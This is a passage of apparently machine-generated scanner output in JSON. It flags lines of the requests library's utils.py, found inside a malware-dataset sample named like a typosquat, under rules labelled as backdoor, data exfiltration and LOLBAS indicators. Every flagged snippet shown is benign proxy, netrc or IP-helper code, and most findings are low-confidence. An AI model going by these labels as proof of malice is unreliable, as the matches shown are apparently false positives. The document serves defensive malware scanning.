                    "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                    "rendered": {
                      "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                      "markdown": "`    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 726,
                  "startColumn": 23,
                  "endLine": 726,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n",
                    "rendered": {
                      "text": "    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n",
                      "markdown": "`    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 20,
                  "endLine": 182,
                  "endColumn": 31,
                  "snippet": {
                    "text": "def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n",
                    "rendered": {
                      "text": "def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n",
                      "markdown": "`def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 17,
                  "endLine": 34,
                  "endColumn": 33,
                  "snippet": {
                    "text": "from .compat import (\n    quote, urlparse, bytes, str, unquote, getproxies,\n    proxy_bypass, urlunparse, basestring, integer_types, is_py3,\n    proxy_bypass_environment, getproxies_environment, Mapping)\nfrom .cookies import cookiejar_from_dict\nfrom .structures import CaseInsensitiveDict\nfrom .exceptions import (\n",
                    "rendered": {
                      "text": "from .compat import (\n    quote, urlparse, bytes, str, unquote, getproxies,\n    proxy_bypass, urlunparse, basestring, integer_types, is_py3,\n    proxy_bypass_environment, getproxies_environment, Mapping)\nfrom .cookies import cookiejar_from_dict\nfrom .structures import CaseInsensitiveDict\nfrom .exceptions import (\n",
                      "markdown": "`from .compat import (\n    quote, urlparse, bytes, str, unquote, getproxies,\n    proxy_bypass, urlunparse, basestring, integer_types, is_py3,\n    proxy_bypass_environment, getproxies_environment, Mapping)\nfrom .cookies import cookiejar_from_dict\nfrom .structures import CaseInsensitiveDict\nfrom .exceptions import (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 825,
                  "startColumn": 28,
                  "endLine": 825,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n    ]\n    proxy = None\n",
                    "rendered": {
                      "text": "    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n    ]\n    proxy = None\n",
                      "markdown": "`    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n    ]\n    proxy = None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 823,
                  "startColumn": 43,
                  "endLine": 823,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n",
                    "rendered": {
                      "text": "        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n",
                      "markdown": "`        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 819,
                  "startColumn": 16,
                  "endLine": 819,
                  "endColumn": 24,
                  "snippet": {
                    "text": "    \"\"\"\n    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n",
                    "rendered": {
                      "text": "    \"\"\"\n    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n",
                      "markdown": "`    \"\"\"\n    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 789,
                  "startColumn": 41,
                  "endLine": 789,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n            bypass = False\n\n",
                    "rendered": {
                      "text": "    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n            bypass = False\n\n",
                      "markdown": "`    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n            bypass = False\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 787,
                  "startColumn": 17,
                  "endLine": 787,
                  "endColumn": 25,
                  "snippet": {
                    "text": "                    return True\n\n    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n",
                    "rendered": {
                      "text": "                    return True\n\n    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n",
                      "markdown": "`                    return True\n\n    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 781,
                  "startColumn": 26,
                  "endLine": 781,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                host_with_port += ':{}'.format(parsed.port)\n\n            for host in no_proxy:\n                if parsed.hostname.endswith(host) or host_with_port.endswith(host):\n                    # The URL does match something in no_proxy, so we don't want\n                    # to apply the proxies on this URL.\n                    return True\n",
                    "rendered": {
                      "text": "                host_with_port += ':{}'.format(parsed.port)\n\n            for host in no_proxy:\n                if parsed.hostname.endswith(host) or host_with_port.endswith(host):\n                    # The URL does match something in no_proxy, so we don't want\n                    # to apply the proxies on this URL.\n                    return True\n",
                      "markdown": "`                host_with_port += ':{}'.format(parsed.port)\n\n            for host in no_proxy:\n                if parsed.hostname.endswith(host) or host_with_port.endswith(host):\n                    # The URL does match something in no_proxy, so we don't want\n                    # to apply the proxies on this URL.\n                    return True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 776,
                  "startColumn": 36,
                  "endLine": 776,
                  "endColumn": 44,
                  "snippet": {
                    "text": "                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n            if parsed.port:\n                host_with_port += ':{}'.format(parsed.port)\n\n",
                    "rendered": {
                      "text": "                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n            if parsed.port:\n                host_with_port += ':{}'.format(parsed.port)\n\n",
                      "markdown": "`                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n            if parsed.port:\n                host_with_port += ':{}'.format(parsed.port)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 771,
                  "startColumn": 28,
                  "endLine": 771,
                  "endColumn": 36,
                  "snippet": {
                    "text": "                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n",
                    "rendered": {
                      "text": "                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n",
                      "markdown": "`                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 769,
                  "startColumn": 49,
                  "endLine": 769,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n",
                    "rendered": {
                      "text": "        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n",
                      "markdown": "`        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 766,
                  "startColumn": 34,
                  "endLine": 766,
                  "endColumn": 42,
                  "snippet": {
                    "text": "            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n\n        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n",
                    "rendered": {
                      "text": "            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n\n        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n",
                      "markdown": "`            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n\n        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 761,
                  "startColumn": 25,
                  "endLine": 761,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n    if no_proxy:\n        # We need to check whether we match here. We need to see if we match\n        # the end of the hostname, both with and without the port.\n        no_proxy = (\n            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n",
                    "rendered": {
                      "text": "\n    if no_proxy:\n        # We need to check whether we match here. We need to see if we match\n        # the end of the hostname, both with and without the port.\n        no_proxy = (\n            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n",
                      "markdown": "`\n    if no_proxy:\n        # We need to check whether we match here. We need to see if we match\n        # the end of the hostname, both with and without the port.\n        no_proxy = (\n            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 755,
                  "startColumn": 14,
                  "endLine": 755,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        no_proxy = get_proxy('no_proxy')\n    parsed = urlparse(url)\n\n    if parsed.hostname is None:\n        # URLs don't always have hostnames, e.g. file:/// urls.\n        return True\n\n",
                    "rendered": {
                      "text": "        no_proxy = get_proxy('no_proxy')\n    parsed = urlparse(url)\n\n    if parsed.hostname is None:\n        # URLs don't always have hostnames, e.g. file:/// urls.\n        return True\n\n",
                      "markdown": "`        no_proxy = get_proxy('no_proxy')\n    parsed = urlparse(url)\n\n    if parsed.hostname is None:\n        # URLs don't always have hostnames, e.g. file:/// urls.\n        return True\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 773,
                  "startColumn": 33,
                  "endLine": 773,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n",
                    "rendered": {
                      "text": "                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n",
                      "markdown": "`                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 772,
                  "startColumn": 57,
                  "endLine": 772,
                  "endColumn": 61,
                  "snippet": {
                    "text": "                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n",
                    "rendered": {
                      "text": "                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n",
                      "markdown": "`                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 772,
                  "startColumn": 33,
                  "endLine": 772,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n",
                    "rendered": {
                      "text": "                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n",
                      "markdown": "`                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 659,
                  "startColumn": 29,
                  "endLine": 659,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n    \"\"\"\n",
                    "rendered": {
                      "text": "    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n    \"\"\"\n",
                      "markdown": "`    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 658,
                  "startColumn": 28,
                  "endLine": 658,
                  "endColumn": 32,
                  "snippet": {
                    "text": "def address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n",
                    "rendered": {
                      "text": "def address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n",
                      "markdown": "`def address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 656,
                  "startColumn": 46,
                  "endLine": 656,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n\ndef address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n",
                    "rendered": {
                      "text": "\n\ndef address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n",
                      "markdown": "`\n\ndef address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
